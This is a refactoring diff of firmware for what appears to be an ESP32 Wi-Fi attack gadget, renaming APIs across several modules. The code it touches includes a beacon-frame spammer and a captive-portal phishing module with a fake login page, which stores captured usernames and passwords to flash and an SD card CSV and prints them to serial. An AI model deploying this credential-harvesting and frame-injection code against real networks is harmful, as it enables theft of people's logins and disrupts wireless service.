@@ -2,6 +2,7 @@
 #include "SettingsStore.h"
 #include "Touchscreen.h"
 #include "config.h"
+#include <cmath>
 #include <inttypes.h>
 #include "esp_timer.h"
 #include "esp_wifi.h"
@@ -158,8 +159,8 @@ struct __attribute__((packed)) PcapRecordHeader {
 
 static bool  pcapEnabled = false;
 static bool  pcapMounted = false;
-static File  pcapFile;
-static String pcapPath;
+static DivFile  pcapFile;
+static DivString pcapPath;
 static uint32_t pcapPacketsWritten = 0;
 static uint32_t pcapDropped = 0;
 static uint32_t pcapLastFlushMs = 0;
@@ -176,7 +177,7 @@ static QueueHandle_t pcapWriteQ = nullptr;
 
 static bool pcapMountSD() {
   if (pcapMounted) {
-    if (SD.exists("/")) return true;
+    if (DivSd.exists("/")) return true;
     pcapMounted = false;
   }
 
@@ -186,18 +187,18 @@ static bool pcapMountSD() {
 
 static bool pcapEnsureDir(const char* dirPath) {
   if (!pcapMountSD()) return false;
-  if (SD.exists(dirPath)) return true;
-  if (SD.mkdir(dirPath)) return true;
-  if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
+  if (DivSd.exists(dirPath)) return true;
+  if (DivSd.mkdir(dirPath)) return true;
+  if (dirPath && dirPath[0] == '/') return DivSd.mkdir(dirPath + 1);
   return false;
 }
 
-static bool pcapMakeNextPath(String& outPath) {
+static bool pcapMakeNextPath(DivString& outPath) {
 
   for (uint16_t i = 0; i < 10000; i++) {
     char buf[64];
     snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
-    if (!SD.exists(buf)) { outPath = String(buf); return true; }
+    if (!DivSd.exists(buf)) { outPath = DivString(buf); return true; }
   }
   return false;
 }
@@ -237,7 +238,7 @@ static void pcapStart() {
   if (!pcapEnsureDir(CAPTURE_DIR)) return;
   if (!pcapMakeNextPath(pcapPath)) return;
 
-  pcapFile = SD.open(pcapPath.c_str(), FILE_WRITE);
+  pcapFile = DivSd.open(pcapPath.c_str(), FILE_WRITE);
   if (!pcapFile) { pcapPath = ""; return; }
 
   PcapGlobalHeader gh{};
@@ -286,7 +287,7 @@ static void ptmStartRadioAndPcapOnce() {
   wifi_mode_t wm = WIFI_MODE_NULL;
   const esp_err_t gm = esp_wifi_get_mode(&wm);
   if (gm == ESP_ERR_WIFI_NOT_INIT) {
-    WiFi.mode(WIFI_MODE_NULL);
+    DivWiFi.mode(WIFI_MODE_NULL);
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
     ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
@@ -299,9 +300,9 @@ static void ptmStartRadioAndPcapOnce() {
 
   pcapStart();
   if (pcapEnabled && pcapPath.length()) {
-    Serial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
+    DivSerial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
   } else {
-    Serial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
+    DivSerial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
   }
 }
 
@@ -766,7 +767,7 @@ void ptmSetup() {
 
   setupTouchscreen();
 
-  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));
+  sampling_period_us = std::round(1000000 * (1.0 / samplingFrequency));
 
   for (int i = 0; i < 32; i++) {
     palette_red[i] = i / 2;
@@ -815,7 +816,7 @@ void ptmLoop() {
 
     esp_wifi_set_promiscuous(false);
     if (pcapPacketsWritten || pcapDropped) {
-      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
+      DivSerial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                     (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
     }
     pcapStop();
@@ -827,7 +828,7 @@ void ptmLoop() {
   if (feature_exit_requested) {
     esp_wifi_set_promiscuous(false);
     if (pcapPacketsWritten || pcapDropped) {
-      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
+      DivSerial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                     (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
     }
     pcapStop();
@@ -915,7 +916,7 @@ bool btnLeftPress;
 bool btnRightPress;
 bool btnSelectPress;
 
-String ssidList[] = {
+DivString ssidList[] = {
   "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
   "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
   "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
@@ -1034,7 +1035,7 @@ void output() {
   tft.setTextFont(1);
   tft.setTextSize(1);
 
-  auto printLine = [](int y, uint16_t color, const String& text) {
+  auto printLine = [](int y, uint16_t color, const DivString& text) {
     if (!spamYFits(y, 10)) {
       return;
     }
@@ -1080,7 +1081,7 @@ void output() {
     if (!spamYFits(y, 10)) {
       break;
     }
-    String randomSSID = ssidList[wifiRandInt(ssidCount)];
+    DivString randomSSID = ssidList[wifiRandInt(ssidCount)];
     tft.setTextColor(WHITE, TFT_BLACK);
     tft.setCursor(2, y);
     tft.print("[+] ");
@@ -1098,7 +1099,7 @@ void spammer() {
     packet[i] = (uint8_t)wifiRandU32(256);
   }
 
-  String randomSSID = ssidList[wifiRandInt(ssidCount)];
+  DivString randomSSID = ssidList[wifiRandInt(ssidCount)];
   int ssidLength = randomSSID.length();
   packet[37] = ssidLength;
 
@@ -1118,7 +1119,7 @@ void spammer() {
 }
 
 void beaconSpam() {
-    String ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
+    DivString ssid = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";
     byte channel;
 
     uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
@@ -1154,31 +1155,31 @@ void beaconSpam() {
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_err_t err = esp_wifi_init(&cfg);
     if (err != ESP_OK) {
-        Serial.printf("WiFi init failed: %d\n", err);
+        DivSerial.printf("WiFi init failed: %d\n", err);
         return;
     }
 
     err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
     if (err != ESP_OK) {
-        Serial.printf("Storage set failed: %d\n", err);
+        DivSerial.printf("Storage set failed: %d\n", err);
         return;
     }
 
     err = esp_wifi_set_mode(WIFI_MODE_AP);
     if (err != ESP_OK) {
-        Serial.printf("Mode set failed: %d\n", err);
+        DivSerial.printf("Mode set failed: %d\n", err);
         return;
     }
 
     err = esp_wifi_start();
     if (err != ESP_OK) {
-        Serial.printf("WiFi start failed: %d\n", err);
+        DivSerial.printf("WiFi start failed: %d\n", err);
         return;
     }
 
     err = esp_wifi_set_promiscuous(true);
     if (err != ESP_OK) {
-        Serial.printf("Promiscuous set failed: %d\n", err);
+        DivSerial.printf("Promiscuous set failed: %d\n", err);
         return;
     }
 
@@ -1205,15 +1206,15 @@ void beaconSpam() {
         esp_err_t result;
         result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
         if (result != ESP_OK) {
-            Serial.printf("Packet 1 send failed: %d\n", result);
+            DivSerial.printf("Packet 1 send failed: %d\n", result);
         }
         result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
         if (result != ESP_OK) {
-            Serial.printf("Packet 2 send failed: %d\n", result);
+            DivSerial.printf("Packet 2 send failed: %d\n", result);
         }
         result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
         if (result != ESP_OK) {
-            Serial.printf("Packet 3 send failed: %d\n", result);
+            DivSerial.printf("Packet 3 send failed: %d\n", result);
         }
 
         delay(1);
@@ -1372,19 +1373,19 @@ void beaconSpamSetup() {
   esp_err_t err;
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   err = esp_wifi_init(&cfg);
-  if (err != ESP_OK) Serial.printf("WiFi init failed: %d\n", err);
+  if (err != ESP_OK) DivSerial.printf("WiFi init failed: %d\n", err);
 
   err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
-  if (err != ESP_OK) Serial.printf("Storage set failed: %d\n", err);
+  if (err != ESP_OK) DivSerial.printf("Storage set failed: %d\n", err);
 
   err = esp_wifi_set_mode(WIFI_MODE_AP);
-  if (err != ESP_OK) Serial.printf("Mode set failed: %d\n", err);
+  if (err != ESP_OK) DivSerial.printf("Mode set failed: %d\n", err);
 
   err = esp_wifi_start();
-  if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);
+  if (err != ESP_OK) DivSerial.printf("WiFi start failed: %d\n", err);
 
   err = esp_wifi_set_promiscuous(true);
-  if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);
+  if (err != ESP_OK) DivSerial.printf("Promiscuous set failed: %d\n", err);
 
 #if HAS_PCF8574_BUTTONS
   pcf.pinMode(BTN_UP, INPUT_PULLUP);
@@ -1489,12 +1490,12 @@ static int deauthVisibleLines() {
 bool stopScan = false;
 bool exitMode = false;
 
-String terminalBuffer[DEAUTH_TERM_CAPACITY];
+DivString terminalBuffer[DEAUTH_TERM_CAPACITY];
 uint16_t colorBuffer[DEAUTH_TERM_CAPACITY];
 int lineIndex = 0;
 
 int deauth[MAX_NETWORKS] = {0};
-String ssidLists[MAX_NETWORKS];
+DivString ssidLists[MAX_NETWORKS];
 uint8_t macList[MAX_NETWORKS][6];
 
 static volatile bool deauthAlertPending = false;
@@ -1522,7 +1523,7 @@ void scrollTerminal() {
   }
 }
 
-void displayPrint(String text, uint16_t color, bool extraSpace = false) {
+void displayPrint(DivString text, uint16_t color, bool extraSpace = false) {
   if (!feature_active || exitMode) {
     return;
   }
@@ -1613,9 +1614,9 @@ static void deauthFlushPendingAlert() {
 static void deauthPopulateScanResults(int n) {
   s_knownNetworkCount = min(n, MAX_NETWORKS);
   for (int i = 0; i < s_knownNetworkCount; i++) {
-    String fullSSID = WiFi.SSID(i);
+    DivString fullSSID = DivWiFi.SSID(i);
     ssidLists[i] = fullSSID.substring(0, MAX_SSID_LENGTH);
-    const uint8_t* bssid = WiFi.BSSID(i);
+    const uint8_t* bssid = DivWiFi.BSSID(i);
     if (bssid) {
       memcpy(macList[i], bssid, 6);
     } else {
@@ -1626,8 +1627,8 @@ static void deauthPopulateScanResults(int n) {
     snprintf(line, sizeof(line), "[+] %s%s | CH: %u | RSSI: %d",
              ssidLists[i].c_str(),
              fullSSID.length() > MAX_SSID_LENGTH ? "..." : "",
-             (unsigned)WiFi.channel(i),
-             (int)WiFi.RSSI(i));
+             (unsigned)DivWiFi.channel(i),
+             (int)DivWiFi.RSSI(i));
     displayPrint(line, FEATURE_TEXT);
     if (exitMode || stopScan) {
       break;
@@ -1645,7 +1646,7 @@ void analyzeNetworks(int n) {
 
     bool isDuplicate = false;
     bool isHidden = (ssidLists[i] == "");
-    bool isWeirdChannel = WiFi.channel(i) > 13;
+    bool isWeirdChannel = DivWiFi.channel(i) > 13;
 
     for (int j = 0; j < n; j++) {
       if (i != j && ssidLists[i] == ssidLists[j] && memcmp(macList[i], macList[j], 6) != 0) {
@@ -1662,7 +1663,7 @@ void analyzeNetworks(int n) {
     }
     if (isWeirdChannel) {
       char line[64];
-      snprintf(line, sizeof(line), "[!] Non-Standard Channel: %u", (unsigned)WiFi.channel(i));
+      snprintf(line, sizeof(line), "[!] Non-Standard Channel: %u", (unsigned)DivWiFi.channel(i));
       displayPrint(line, UI_WARN, true);
     }
 
@@ -1685,7 +1686,7 @@ static void deauthBeginListen() {
 static void deauthAbortAsyncScan() {
   if (s_asyncScanActive) {
     (void)esp_wifi_scan_stop();
-    WiFi.scanDelete();
+    DivWiFi.scanDelete();
     s_asyncScanActive = false;
   }
 }
@@ -1699,14 +1700,14 @@ static void deauthStepScan() {
   if (!s_scanBannerShown) {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
-    WiFi.scanDelete();
+    DivWiFi.scanDelete();
     displayPrint("[*] Scanning WiFi networks", UI_TEXT, true);
     s_scanBannerShown = true;
   }
 
   if (!s_asyncScanActive) {
     const uint32_t dwell = wifiStaScanMsPerChannel();
-    const int ret = WiFi.scanNetworks(true, true, false, dwell);
+    const int ret = DivWiFi.scanNetworks(true, true, false, dwell);
     if (ret == WIFI_SCAN_RUNNING) {
       s_asyncScanActive = true;
       return;
@@ -1725,7 +1726,7 @@ static void deauthStepScan() {
     return;
   }
 
-  const int n = WiFi.scanComplete();
+  const int n = DivWiFi.scanComplete();
   if (n == WIFI_SCAN_RUNNING) {
     if (feature_exit_requested || featureExitButtonPressed()) {
       exitMode = true;
@@ -1760,8 +1761,8 @@ static void deauthTeardown() {
   deauthAbortAsyncScan();
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(nullptr);
-  WiFi.scanDelete();
-  WiFi.disconnect();
+  DivWiFi.scanDelete();
+  DivWiFi.disconnect();
   stopScan = false;
   exitMode = false;
   lineIndex = 0;
@@ -1894,9 +1895,9 @@ void deauthdetectSetup() {
   drawStatusBar(currentBatteryVoltage, true, true);
   redrawTouchButtonBar();
 
-  WiFi.scanDelete();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  DivWiFi.scanDelete();
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect();
   delay(100);
 
 #if HAS_PCF8574_BUTTONS
@@ -1975,14 +1976,14 @@ static uint32_t bgBootMs = 0;
 /** Stop an in-flight scan started by the background task only — never abort foreground/manual scans. */
 static void stopBgWifiScanIfRunning() {
   if (fgWifiScanInProgress) return;
-  if (!bgScanRunning && WiFi.scanComplete() != WIFI_SCAN_RUNNING) return;
-  if (WiFi.scanComplete() != WIFI_SCAN_RUNNING) {
+  if (!bgScanRunning && DivWiFi.scanComplete() != WIFI_SCAN_RUNNING) return;
+  if (DivWiFi.scanComplete() != WIFI_SCAN_RUNNING) {
     bgScanRunning = false;
     return;
   }
   (void)esp_wifi_scan_stop();
   const uint32_t start = millis();
-  while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && (millis() - start) < 5000u) {
+  while (DivWiFi.scanComplete() == WIFI_SCAN_RUNNING && (millis() - start) < 5000u) {
     vTaskDelay(10 / portTICK_PERIOD_MS);
   }
   bgScanRunning = false;
@@ -1997,11 +1998,11 @@ static void bgWifiScanTask(void* ) {
     if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {
 
       if (!bgScanRunning) {
-        WiFi.mode(WIFI_STA);
-        WiFi.disconnect();
-        WiFi.scanDelete();
+        DivWiFi.mode(WIFI_STA);
+        DivWiFi.disconnect();
+        DivWiFi.scanDelete();
         const uint32_t dwell = wifiStaScanMsPerChannel();
-        int ret = WiFi.scanNetworks(true, true, false, dwell);
+        int ret = DivWiFi.scanNetworks(true, true, false, dwell);
 
         bgScanRunning = (ret == WIFI_SCAN_RUNNING);
         if (ret >= 0) {
@@ -2016,7 +2017,7 @@ static void bgWifiScanTask(void* ) {
           vTaskDelay(250 / portTICK_PERIOD_MS);
         }
       } else {
-        int n = WiFi.scanComplete();
+        int n = DivWiFi.scanComplete();
         if (n >= 0) {
           bgHasResults = true;
           bgLastScanMs = now;
@@ -2024,7 +2025,7 @@ static void bgWifiScanTask(void* ) {
           vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
         } else if (n == WIFI_SCAN_FAILED) {
           bgScanRunning = false;
-          WiFi.scanDelete();
+          DivWiFi.scanDelete();
           vTaskDelay(2000 / portTICK_PERIOD_MS);
         } else {
 
@@ -2057,13 +2058,13 @@ void startBackgroundScanner() {
 int getLastCount() {
 
   if (!settings().autoWifiScan) return 0;
-  int n = WiFi.scanComplete();
+  int n = DivWiFi.scanComplete();
   return (n < 0) ? 0 : n;
 }
 
 bool wifiCacheValidForReuse() {
   if (!settings().autoWifiScan || !bgHasResults) return false;
-  return WiFi.scanComplete() > 0;
+  return DivWiFi.scanComplete() > 0;
 }
 
 int staWifiScanSync() {
@@ -2071,13 +2072,13 @@ int staWifiScanSync() {
   if (bgScanRunning) {
     stopBgWifiScanIfRunning();
   }
-  WiFi.scanDelete();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  DivWiFi.scanDelete();
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect();
   delay(50);
   const uint32_t dwell = wifiStaScanMsPerChannel();
   fgWifiScanInProgress = true;
-  const int n = WiFi.scanNetworks(false, true, false, dwell);
+  const int n = DivWiFi.scanNetworks(false, true, false, dwell);
   fgWifiScanInProgress = false;
   if (n >= 0) {
     bgHasResults = true;
@@ -2091,7 +2092,7 @@ bool loadApListFromWifiCache(wifi_ap_record_t** ap_list, int* network_count,
   if (!wifiCacheValidForReuse() || !ap_list || !network_count || !compare_ap) {
     return false;
   }
-  const int n = WiFi.scanComplete();
+  const int n = DivWiFi.scanComplete();
   if (n <= 0) return false;
 
   if (*ap_list) {
@@ -2106,12 +2107,12 @@ bool loadApListFromWifiCache(wifi_ap_record_t** ap_list, int* network_count,
   }
   for (int i = 0; i < n; i++) {
     wifi_ap_record_t ap_record = {};
-    memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
-    strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+    memcpy(ap_record.bssid, DivWiFi.BSSID(i), 6);
+    strncpy((char*)ap_record.ssid, DivWiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
     ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
-    ap_record.rssi = WiFi.RSSI(i);
-    ap_record.primary = WiFi.channel(i);
-    ap_record.authmode = WiFi.encryptionType(i);
+    ap_record.rssi = DivWiFi.RSSI(i);
+    ap_record.primary = DivWiFi.channel(i);
+    ap_record.authmode = DivWiFi.encryptionType(i);
     (*ap_list)[i] = ap_record;
   }
   qsort(*ap_list, (size_t)n, sizeof(wifi_ap_record_t), compare_ap);
@@ -2186,14 +2187,14 @@ static int last_rendered_index = -1;
 static void drawNetworkRow(int i, int y, bool isSel) {
   char buf[64];
   char ssid[16];
-  String fullSSID = WiFi.SSID(i);
+  DivString fullSSID = DivWiFi.SSID(i);
   strncpy(ssid, fullSSID.c_str(), 11);
   ssid[11] = '\0';
   if (fullSSID.length() > 11) strcat(ssid, "...");
 
-  const int rssi = WiFi.RSSI(i);
-  const int ch = WiFi.channel(i);
-  const int auth = WiFi.encryptionType(i);
+  const int rssi = DivWiFi.RSSI(i);
+  const int ch = DivWiFi.channel(i);
+  const int auth = DivWiFi.encryptionType(i);
   const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
   snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, rssi, ch, enc);
 
@@ -2211,7 +2212,7 @@ static void drawNetworkRow(int i, int y, bool isSel) {
 
 void displayWiFiList(bool fullRedraw = false) {
   uiDrawn = false;
-  int networkCount = WiFi.scanComplete();
+  int networkCount = DivWiFi.scanComplete();
 
   if (fullRedraw) {
     tft.drawFastHLine(0, 19, 240, UI_LINE);
@@ -2315,15 +2316,15 @@ void startWiFiScan() {
   if (bgScanRunning) {
     stopBgWifiScanIfRunning();
   }
-  WiFi.scanDelete();
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  DivWiFi.scanDelete();
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect();
   delay(50);
   const uint32_t dwell = wifiStaScanMsPerChannel();
   fgWifiScanInProgress = true;
-  int numNetworks = WiFi.scanNetworks(true, true, false, dwell);
+  int numNetworks = DivWiFi.scanNetworks(true, true, false, dwell);
   if (numNetworks == WIFI_SCAN_RUNNING) {
-    while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
+    while (DivWiFi.scanComplete() == WIFI_SCAN_RUNNING) {
       if (feature_exit_requested || featureExitButtonPressed()) {
         (void)esp_wifi_scan_stop();
         fgWifiScanInProgress = false;
@@ -2333,7 +2334,7 @@ void startWiFiScan() {
       }
       delay(50);
     }
-    numNetworks = WiFi.scanComplete();
+    numNetworks = DivWiFi.scanComplete();
   }
   fgWifiScanInProgress = false;
   isScanning = false;
@@ -2350,7 +2351,7 @@ void displayWiFiDetails() {
   uiDrawn = false;
   wifiScanClearBody();
 
-  const int networkCount = WiFi.scanComplete();
+  const int networkCount = DivWiFi.scanComplete();
   if (networkCount <= 0) {
     isDetailView = false;
     displayWiFiList(true);
@@ -2359,18 +2360,18 @@ void displayWiFiDetails() {
   if (currentIndex < 0) currentIndex = 0;
   if (currentIndex >= networkCount) currentIndex = networkCount - 1;
 
-  String ssid = WiFi.SSID(currentIndex);
-  String bssid = WiFi.BSSIDstr(currentIndex);
-  int rssi = WiFi.RSSI(currentIndex);
-  int channel = WiFi.channel(currentIndex);
-  int encryption = WiFi.encryptionType(currentIndex);
+  DivString ssid = DivWiFi.SSID(currentIndex);
+  DivString bssid = DivWiFi.BSSIDstr(currentIndex);
+  int rssi = DivWiFi.RSSI(currentIndex);
+  int channel = DivWiFi.channel(currentIndex);
+  int encryption = DivWiFi.encryptionType(currentIndex);
   bool isHidden = (ssid.length() == 0);
   int y = 50;
 
   float signalQuality = constrain(2 * (rssi + 100), 0, 100);
-  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
+  float estimatedDistance = std::pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));
 
-  String encryptionType;
+  DivString encryptionType;
   switch (encryption) {
     case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
     case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
@@ -2434,7 +2435,7 @@ void handleButton() {
   }
 
   if (isButtonPressed(BTN_DOWN)) {
-    if (!isDetailView && currentIndex < WiFi.scanComplete() - 1) {
+    if (!isDetailView && currentIndex < DivWiFi.scanComplete() - 1) {
       currentIndex++;
       delay(200);
       current_page = currentIndex / max(1, wifiNetworksPerPage());
@@ -2542,7 +2543,7 @@ void runUI() {
                     }
                 }
             } else if (!isScanning) {
-                const int networkCount = WiFi.scanComplete();
+                const int networkCount = DivWiFi.scanComplete();
 
                 // Deauther-like bottom bar has a large touch hitbox.
                 if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
@@ -2617,14 +2618,14 @@ void wifiscanSetup() {
 
   setupTouchscreen();
 
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
+  DivWiFi.mode(WIFI_STA);
+  DivWiFi.disconnect();
 
   if (bgScanRunning) {
     stopBgWifiScanIfRunning();
   }
 
-  int existing = WiFi.scanComplete();
+  int existing = DivWiFi.scanComplete();
   // With auto scan off, nothing refreshes the WiFi driver cache — reusing it shows stale/partial lists.
   if (settings().autoWifiScan && existing >= 0 && bgHasResults) {
     current_page = 0;
@@ -2765,14 +2766,14 @@ static void stopAttack();
 static void startAttack();
 void drawMainMenu();
 
-#define EEPROM_SIZE 1440
+#define NVSTORE_SIZE 1440
 #define SSID_ADDR 0
 #define CRED_ADDR 32
 #define COUNT_ADDR 1248
 #define MAX_CREDS 20
 #define CRED_SIZE 64
 
-String terminalBuffer[MAX_LINES];
+DivString terminalBuffer[MAX_LINES];
 uint16_t colorBuffer[MAX_LINES];
 int lineIndex = 0;
 
@@ -2786,13 +2787,13 @@ enum Screen { MAIN_MENU, CRED_LIST };
 Screen currentScreen = MAIN_MENU;
 int credPage = 0;
 
-String inputSSID = "";
+DivString inputSSID = "";
 
 const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
 const int numSeriesSSIDs = 3;
 int seriesSSIDIndex = 0;
 
-String loginPage = R"(
+DivString loginPage = R"(
 <!DOCTYPE html>
 <html>
 <head>
@@ -2831,7 +2832,7 @@ void scrollTerminal() {
   }
 }
 
-void displayPrint(String text, uint16_t color, bool extraSpace = false) {
+void displayPrint(DivString text, uint16_t color, bool extraSpace = false) {
   if (lineIndex >= MAX_LINES - 1) {
     scrollTerminal();
     lineIndex = MAX_LINES - 1;
@@ -2861,7 +2862,7 @@ void displayPrint(String text, uint16_t color, bool extraSpace = false) {
   }
 }
 
-void saveCredential(String username, String password, String ssid) {
+void saveCredential(DivString username, DivString password, DivString ssid) {
   Credential cred;
   strncpy(cred.username, username.c_str(), 15);
   cred.username[15] = '\0';
@@ -2870,21 +2871,21 @@ void saveCredential(String username, String password, String ssid) {
   strncpy(cred.ssid, ssid.c_str(), 31);
   cred.ssid[31] = '\0';
 
-  int count = EEPROM.read(COUNT_ADDR);
-  Serial.printf("Before saving, credential count: %d\n", count);
+  int count = DivNvStore.read(COUNT_ADDR);
+  DivSerial.printf("Before saving, credential count: %d\n", count);
   if (count < MAX_CREDS) {
     int addr = CRED_ADDR + (count * CRED_SIZE);
-    EEPROM.put(addr, cred);
+    DivNvStore.put(addr, cred);
     count++;
-    EEPROM.write(COUNT_ADDR, count);
-    EEPROM.commit();
-    Serial.printf("Credential saved at address %d\n", addr);
-    Serial.printf("Username: %s\n", cred.username);
-    Serial.printf("Password: %s\n", cred.password);
-    Serial.printf("SSID: %s\n", cred.ssid);
-    Serial.printf("After saving, credential count: %d\n", count);
+    DivNvStore.write(COUNT_ADDR, count);
+    DivNvStore.commit();
+    DivSerial.printf("Credential saved at address %d\n", addr);
+    DivSerial.printf("Username: %s\n", cred.username);
+    DivSerial.printf("Password: %s\n", cred.password);
+    DivSerial.printf("SSID: %s\n", cred.ssid);
+    DivSerial.printf("After saving, credential count: %d\n", count);
   } else {
-    Serial.println("Credential storage full");
+    DivSerial.println("Credential storage full");
   }
 }
 
@@ -2893,7 +2894,7 @@ static bool cp_sd_mounted = false;
 static bool cpMountSD() {
 
   if (cp_sd_mounted) {
-    if (SD.exists("/")) return true;
+    if (DivSd.exists("/")) return true;
     cp_sd_mounted = false;
   }
 
@@ -2903,16 +2904,16 @@ static bool cpMountSD() {
 
 static bool cpEnsureDir(const char* dirPath) {
   if (!cpMountSD()) return false;
-  if (!SD.exists(dirPath)) {
-    if (SD.mkdir(dirPath)) return true;
+  if (!DivSd.exists(dirPath)) {
+    if (DivSd.mkdir(dirPath)) return true;
 
-    if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
+    if (dirPath && dirPath[0] == '/') return DivSd.mkdir(dirPath + 1);
     return false;
   }
   return true;
 }
 
-static String cpCsvEscape(const String& s) {
+static DivString cpCsvEscape(const DivString& s) {
   bool needsQuotes = false;
   for (size_t i = 0; i < s.length(); i++) {
     char c = s[i];
@@ -2920,7 +2921,7 @@ static String cpCsvEscape(const String& s) {
   }
   if (!needsQuotes) return s;
 
-  String out = "\"";
+  DivString out = "\"";
   for (size_t i = 0; i < s.length(); i++) {
     char c = s[i];
     if (c == '"') out += "\"\"";
@@ -2930,14 +2931,14 @@ static String cpCsvEscape(const String& s) {
   return out;
 }
 
-static bool cpAppendLineToFile(const char* path, const String& line) {
+static bool cpAppendLineToFile(const char* path, const DivString& line) {
   if (!cpMountSD()) return false;
 
-  File f = SD.open(path, "a");
+  DivFile f = DivSd.open(path, "a");
   if (!f) {
     cp_sd_mounted = false;
     if (!cpMountSD()) return false;
-    f = SD.open(path, "a");
+    f = DivSd.open(path, "a");
     if (!f) return false;
   }
 
@@ -2947,19 +2948,19 @@ static bool cpAppendLineToFile(const char* path, const String& line) {
   return ok;
 }
 
-static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
+static bool cpAppendCaptureToSD(const DivString& remoteIp, const DivString& username, const DivString& passwordStr, const DivString& ssid) {
   const char* dir = "/captive_portal";
   const char* path = "/captive_portal/captured.csv";
   if (!cpEnsureDir(dir)) return false;
 
-  bool exists = SD.exists(path);
+  bool exists = DivSd.exists(path);
   if (!exists) {
     if (!cpAppendLineToFile(path, "millis,remote_ip,ssid,username,password\r\n")) return false;
   }
 
-  String row;
+  DivString row;
   row.reserve(32 + remoteIp.length() + ssid.length() + username.length() + passwordStr.length());
-  row += String(millis());
+  row += DivString(millis());
   row += ",";
   row += cpCsvEscape(remoteIp);
   row += ",";
@@ -2978,31 +2979,31 @@ static bool cpDumpAllCredentialsToSD(int* outCount) {
   const char* path = "/captive_portal/eeprom_dump.csv";
   if (!cpEnsureDir(dir)) return false;
 
-  int count = EEPROM.read(COUNT_ADDR);
+  int count = DivNvStore.read(COUNT_ADDR);
   if (count < 0) count = 0;
   if (count > MAX_CREDS) count = MAX_CREDS;
 
-  File f = SD.open(path, "w");
+  DivFile f = DivSd.open(path, "w");
   if (!f) {
     cp_sd_mounted = false;
     if (!cpMountSD()) return false;
-    f = SD.open(path, "w");
+    f = DivSd.open(path, "w");
     if (!f) return false;
   }
 
   f.print("index,ssid,username,password\r\n");
   for (int i = 0; i < count; i++) {
     Credential cred;
-    EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
-    String line;
+    DivNvStore.get(CRED_ADDR + (i * CRED_SIZE), cred);
+    DivString line;
     line.reserve(16 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
-    line += String(i);
+    line += DivString(i);
     line += ",";
-    line += cpCsvEscape(String(cred.ssid));
+    line += cpCsvEscape(DivString(cred.ssid));
     line += ",";
-    line += cpCsvEscape(String(cred.username));
+    line += cpCsvEscape(DivString(cred.username));
     line += ",";
-    line += cpCsvEscape(String(cred.password));
+    line += cpCsvEscape(DivString(cred.password));
     line += "\r\n";
     f.print(line);
   }
@@ -3012,7 +3013,7 @@ static bool cpDumpAllCredentialsToSD(int* outCount) {
   return true;
 }
 
-static void cpCredListStatus(const String& msg, uint16_t color) {
